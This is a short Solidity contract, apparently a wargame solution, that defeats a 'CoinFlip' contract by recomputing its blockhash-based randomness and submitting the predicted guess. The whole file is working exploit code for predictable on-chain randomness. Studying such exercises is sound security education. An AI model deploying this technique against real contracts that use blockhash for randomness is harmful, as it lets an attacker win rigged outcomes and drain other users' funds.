// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttacker {
    ICoinFlip coinFlip;
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlip) {
        coinFlip = ICoinFlip(_coinFlip);
    }

    function attack() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool side = blockValue / FACTOR == 1;
        return coinFlip.flip(side);
    }
}